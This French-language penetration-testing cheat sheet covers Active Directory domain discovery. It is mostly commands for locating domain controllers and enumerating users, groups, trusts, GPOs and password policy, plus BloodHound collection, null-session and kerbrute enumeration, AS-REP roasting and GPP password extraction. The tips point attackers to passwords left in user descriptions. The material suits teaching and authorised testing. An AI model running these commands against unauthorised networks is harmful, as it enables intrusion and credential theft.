# Domain Discovery

La découverte de domaine est la première étape après l'obtention d'un accès initial dans un environnement Active Directory. Elle consiste à cartographier le domaine, identifier le contrôleur de domaine, collecter les informations de base et préparer les attaques suivantes.

## Objectifs

- Identifier le contrôleur de domaine et le domaine
- Collecter les informations de base du domaine
- Enumérer les utilisateurs, groupes et ordinateurs
- Identifier la politique de mots de passe
- Cartographier les relations de confiance entre domaines
- Préparer la collecte BloodHound

## Quick Discovery

::: code-group
```bash [NetExec]
nxc smb <target>
nxc smb <DC> -u user -p password --users --groups --computers
```
```bash [Impacket]
impacket-GetADUsers domain.com/user:password -dc-ip <DC> -all
```
```bash [LDAP]
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
```
```bash [BloodHound]
bloodhound-python -u user -p password -d domain.com -dc <DC> -c all
```

:::

## Identifier le Contrôleur de Domaine

### Via DNS
```bash
# Localiser le DC via les enregistrements SRV
nslookup -type=SRV _kerberos._tcp.domain.com
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
nslookup -type=SRV _kerberos._tcp.dc._msdcs.domain.com

# Via dig
dig SRV _kerberos._tcp.domain.com
dig SRV _ldap._tcp.dc._msdcs.domain.com
dig A domain.com

# Résolution du nom du DC
nslookup <DC_hostname>
```

### Via SMB
```bash
# Identifier le DC sur le réseau
nxc smb 192.168.1.0/24
nxc smb 192.168.1.0/24 | grep -i "domain"

# Info domaine via NetExec
nxc smb <DC> -u '' -p ''
nxc smb <DC> -u user -p password
```

### Via RPC
```bash
# Null session
rpcclient -U "" -N <DC> -c "querydominfo"

# Avec credentials
rpcclient -U "user%password" <DC> -c "querydominfo"
rpcclient -U "user%password" <DC> -c "dsroledominfo"
```

### Via LDAP
```bash
# RootDSE — info domaine sans credentials
ldapsearch -x -H ldap://<target> -s base namingcontexts
ldapsearch -x -H ldap://<target> -s base \
  "(objectClass=*)" defaultNamingContext dnsHostName \
  domainFunctionality forestFunctionality domainControllerFunctionality
```

### Via nltest (Windows)
```cmd
nltest /dclist:domain.com
nltest /dsgetdc:domain.com
nltest /domain_trusts
```

## Informations de Base du Domaine

### Nom et SID du domaine
```bash
# Via NetExec
nxc smb <DC> -u user -p password --get-sid

# Via Impacket
impacket-lookupsid domain.com/user:password@<DC>

# Via rpcclient
rpcclient -U "user%password" <DC> -c "lsaquery"

# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=domain)" \
  objectSid ms-DS-MachineAccountQuota
```

### Niveau fonctionnel du domaine
```bash
# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "" -s base domainFunctionality forestFunctionality \
  domainControllerFunctionality

# Niveaux fonctionnels
# 0 → Windows 2000
# 1 → Windows Server 2003 Interim
# 2 → Windows Server 2003
# 3 → Windows Server 2008
# 4 → Windows Server 2008 R2
# 5 → Windows Server 2012
# 6 → Windows Server 2012 R2
# 7 → Windows Server 2016 / 2019 / 2022
```

### Politique de mots de passe
```bash
# Via NetExec
nxc smb <DC> -u user -p password --pass-pol

# Via enum4linux
enum4linux -P <DC>

# Via rpcclient
rpcclient -U "user%password" <DC> -c "getdompwinfo"
rpcclient -U "user%password" <DC> -c "passpol"

# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=domain)" \
  minPwdLength minPwdAge maxPwdAge lockoutThreshold \
  lockoutDuration lockoutObservationWindow pwdHistoryLength

# Fine-Grained Password Policies
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "CN=Password Settings Container,CN=System,DC=domain,DC=com" \
  "(objectClass=msDS-PasswordSettings)"
```

## Enumération des Utilisateurs

### Via NetExec
```bash
# Lister tous les utilisateurs
nxc smb <DC> -u user -p password --users

# Via LDAP
nxc ldap <DC> -u user -p password --users

# Utilisateurs admin
nxc ldap <DC> -u user -p password --admin-count
```

### Via Impacket
```bash
# GetADUsers — tous les utilisateurs
impacket-GetADUsers domain.com/user:password -dc-ip <DC> -all

# Format tableau
impacket-GetADUsers domain.com/user:password -dc-ip <DC> -all | \
  awk '{print $1}'
```

### Via LDAP
```bash
# Tous les utilisateurs
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=user)" \
  sAMAccountName displayName memberOf description

# Utilisateurs activés uniquement
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName

# Utilisateurs avec description (souvent des mots de passe)
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=user)(description=*))" \
  sAMAccountName description

# Utilisateurs sans pré-auth Kerberos
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName

# Utilisateurs avec SPN (Kerberoastables)
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

### Via RPC
```bash
# Enumération des utilisateurs
rpcclient -U "user%password" <DC> -c "enumdomusers"

# Info utilisateur par RID
rpcclient -U "user%password" <DC> -c "queryuser 0x1f4"

# RID cycling
for i in $(seq 500 1100); do
  rpcclient -U "user%password" <DC> -c "queryuser $i" 2>/dev/null | \
    grep "User Name"
done
```

## Enumération des Groupes

### Via NetExec
```bash
# Tous les groupes
nxc smb <DC> -u user -p password --groups

# Via LDAP
nxc ldap <DC> -u user -p password --groups
```

### Via LDAP
```bash
# Tous les groupes
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=group)" cn member

# Groupes privilégiés
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(cn=Domain Admins)" member

ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(cn=Enterprise Admins)" member

ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(cn=Administrators)" member
```

### Via RPC
```bash
# Lister les groupes
rpcclient -U "user%password" <DC> -c "enumdomgroups"

# Membres d'un groupe par RID
rpcclient -U "user%password" <DC> -c "querygroupmem 0x200"
```

## Enumération des Ordinateurs

### Via NetExec
```bash
# Tous les ordinateurs
nxc smb <DC> -u user -p password --computers

# Via LDAP
nxc ldap <DC> -u user -p password --computers
```

### Via LDAP
```bash
# Tous les ordinateurs
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=computer)" \
  sAMAccountName operatingSystem operatingSystemVersion dNSHostName

# Contrôleurs de domaine
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" \
  sAMAccountName dNSHostName operatingSystem
```

### Via RPC
```bash
rpcclient -U "user%password" <DC> -c "enumdomains"
rpcclient -U "user%password" <DC> -c "netshareenumall"
```

## Relations de Confiance (Trusts)

### Identifier les trusts
```bash
# Via NetExec
nxc ldap <DC> -u user -p password --trusted-for-delegation

# Via Impacket
impacket-GetADUsers domain.com/user:password -dc-ip <DC> -all 2>&1 | \
  grep -i trust

# Via rpcclient
rpcclient -U "user%password" <DC> -c "enumtrust"
rpcclient -U "user%password" <DC> -c "dsenumdomtrusts"

# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "CN=System,DC=domain,DC=com" \
  "(objectClass=trustedDomain)" \
  name trustDirection trustType trustAttributes

# Via nltest (Windows)
nltest /domain_trusts
nltest /trusted_domains
```

### Types de trusts

| Type | Direction | Description |
|---|---|---|
| Parent-Child | Bidirectionnel | Domaine parent → enfant |
| Tree-Root | Bidirectionnel | Racine de l'arbre de domaine |
| Shortcut | Défini | Raccourci entre domaines |
| External | Défini | Trust vers domaine externe |
| Forest | Défini | Trust entre forêts |

## Enumération des GPO
```bash
# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "CN=Policies,CN=System,DC=domain,DC=com" \
  "(objectClass=groupPolicyContainer)" displayName gPCFileSysPath

# Via NetExec
nxc smb <DC> -u user -p password -M gpp_password
nxc smb <DC> -u user -p password -M gpp_autologin
```

## Enumération des OUs
```bash
# Via LDAP
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=organizationalUnit)" \
  ou description

# Arborescence complète
ldapsearch -x -H ldap://<DC> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=*)" dn | grep "dn:"
```

## Dump Complet avec ldapdomaindump
```bash
# Dump complet — génère des fichiers HTML et JSON
ldapdomaindump <DC> -u 'domain\user' -p password -o /tmp/ldap_dump

# Fichiers générés
/tmp/ldap_dump/
├── domain_computers.html
├── domain_computers.json
├── domain_groups.html
├── domain_groups.json
├── domain_policy.html
├── domain_policy.json
├── domain_trusts.html
├── domain_trusts.json
├── domain_users.html
└── domain_users.json
```

## BloodHound — Collecte Complète
```bash
# Collecte complète
bloodhound-python -u user -p password -d domain.com -dc <DC> -c all

# Collecte ciblée
bloodhound-python -u user -p password -d domain.com -dc <DC> -c DCOnly
bloodhound-python -u user -p password -d domain.com -dc <DC> -c Group,User,Computer

# Avec hash NTLM
bloodhound-python -u user --hashes :NTLMhash -d domain.com -dc <DC> -c all

# Via NetExec
nxc ldap <DC> -u user -p password --bloodhound -c all --dns-server <DC>

# Importer dans BloodHound
# Démarrer neo4j + bloodhound
sudo neo4j start
bloodhound &
# Glisser-déposer les fichiers JSON dans l'interface
```

## Enumération sans Credentials

### Null session
```bash
# SMB
nxc smb <DC> -u '' -p ''
rpcclient -U "" -N <DC> -c "enumdomusers"

# LDAP null bind
ldapsearch -x -H ldap://<DC> -b "dc=domain,dc=com"

# Nmap
nmap -p445 --script smb-enum-users,smb-enum-shares <DC>
```

### Via Kerberos uniquement
```bash
# Enumérer les utilisateurs valides sans credentials
kerbrute userenum -d domain.com --dc <DC> \
  /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt

# AS-REP Roasting sans credentials
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <DC>
```

## Points d'attaque

- Null session activée énumération sans credentials
- Politique de mots de passe faible ou absente
- Utilisateurs avec description contenant des mots de passe
- Comptes sans pré-authentification Kerberos
- Comptes avec SPN (Kerberoastables)
- Relations de confiance vers d'autres domaines
- GPO avec mots de passe en clair (gpp_password)
- Niveau fonctionnel bas protocoles legacy autorisés

::: info Tips 

- Toujours commencer par `nxc smb <DC> -u user -p password --pass-pol` avant tout spraying éviter les lockouts
- `ldapdomaindump` génère des rapports HTML très lisibles idéal pour prendre connaissance d'un domaine rapidement
- Chercher les **descriptions des utilisateurs** via LDAP les admins y mettent souvent des mots de passe temporaires
- Les **trusts inter-domaines** sont souvent négligés un domaine secondaire moins sécurisé peut permettre de compromettre le domaine principal
- Lancer **BloodHound en parallèle** de l'énumération manuelle les chemins d'attaque apparaissent souvent immédiatement
- Le **niveau fonctionnel du domaine** indique les protocoles disponibles un niveau bas signifie NTLM et RC4 probablement actifs

:::

::: details Checklist

- DC identifié (IP, hostname, domaine)
- SID du domaine récupéré
- Niveau fonctionnel identifié
- Politique de mots de passe récupérée
- Utilisateurs énumérés
- Groupes privilégiés énumérés
- Ordinateurs énumérés
- Descriptions utilisateurs analysées
- Comptes sans pré-auth identifiés
- Comptes avec SPN identifiés
- Trusts inter-domaines identifiés
- GPO analysées
- BloodHound collecte effectuée
- ldapdomaindump effectué

:::


## Ressources

- [HackTricks AD Enumeration](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-information-in-printers)
- [The Hacker Recipes AD Recon](https://www.thehacker.recipes/ad/recon)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [ldapdomaindump GitHub](https://github.com/dirkjanm/ldapdomaindump)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)

## Notes
```
# Notes terrain
```


<div class="page-footer">

<span>![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ad/enumeration/domain-discovery.md)</span>

</div>